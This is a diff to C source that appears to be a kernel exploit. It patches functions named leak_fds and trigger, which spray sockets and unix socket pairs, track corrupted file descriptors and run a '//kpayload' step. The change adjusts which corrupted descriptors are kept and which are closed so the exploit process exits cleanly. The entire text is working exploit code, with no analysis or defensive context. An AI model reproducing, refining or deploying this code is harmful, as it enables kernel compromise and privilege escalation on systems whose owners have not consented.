@@ -392,6 +392,7 @@ int leak_fds(int* fd_to_leak, uintptr_t* out, int nfds)
     close(sock);
     *kp_bad_fds_end++ = socks[bad1];
     *kp_bad_fds_end++ = socks[bad2];
+    *kp_bad_fds_end++ = un[bad3-1];
     *kp_bad_fds_end++ = un[bad3];
     return 0;
 }
@@ -519,13 +520,18 @@ int trigger(int trg_fd, uintptr_t trg_addr, int* sel_cur)
             poll(&pfd, 1, 0); //kpayload
             close(fd_to_pass[j]);
             if(*sel_cur == -1)
+            {
+                bad_un = i;
+                *kp_bad_fds_end++ = un[2*i];
                 *kp_bad_fds_end++ = un[2*i+1];
+            }
         }
     }
     //this code crashes. but if we don't close them explicitly the process will terminate just fine
 #if 0
     for(int i = 0; i < 2*NUM_UNIX; i++)
-        close(un[i]);
+        if(i != 2 * bad_un && i != 2 * bad_un + 1)
+            close(un[i]);
     for(int i = 0; i < SPRAY_SIZE; i++)
         if(i != bad1 && i != bad2)
             close(socks[i]);
